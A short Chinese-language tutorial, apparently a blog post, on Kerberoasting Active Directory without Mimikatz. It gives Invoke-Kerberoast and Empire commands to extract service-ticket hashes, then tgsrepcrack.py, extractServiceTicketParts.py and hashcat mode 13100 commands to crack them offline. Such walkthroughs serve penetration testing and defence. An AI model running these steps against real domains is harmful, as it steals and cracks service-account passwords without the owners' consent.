# Kerberoasting——没有Mimikatz如何导出票据或hash



## 讲在前面：

笔者在之前的介绍Kerberoasting问题时提到了我们还可以使用powershell脚本和empire框架上的模块来实现这个对这个漏洞利用。

[**Invoke-Kerberoast**](https://raw.githubusercontent.com/EmpireProject/Empire/24adb55b3404e1d319b33b70f4fd6b7448ca407c/data/module_source/credentials/Invoke-Kerberoast.ps1)

![](https://img-blog.csdnimg.cn/20201006163316817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

默认情况下将输出成json格式，我们可以指定参数将输出成hashcat可用的格式

```text
Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl   *-AdminCount标志仅标记AdminCount = 1的Kerberoasts帐户*
```

![](https://img-blog.csdnimg.cn/20201006163559885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

使用empire模块进行获取票据hash

![](https://img-blog.csdnimg.cn/20201006165736870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

破解票据：

[**tgsrepcrack.py**](https://github.com/richardracko/active-directory-tools/tree/main/kerberoast)

```text
python tgsrepcrack.py /root/Desktop/passwords.txt test.kirbi
```

[**extractServiceTicketParts.py**](https://github.com/leechristensen/tgscrack)

```text
python extractServiceTicketParts.py test.kirbi
```

**hashcat**

```text
hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force
```

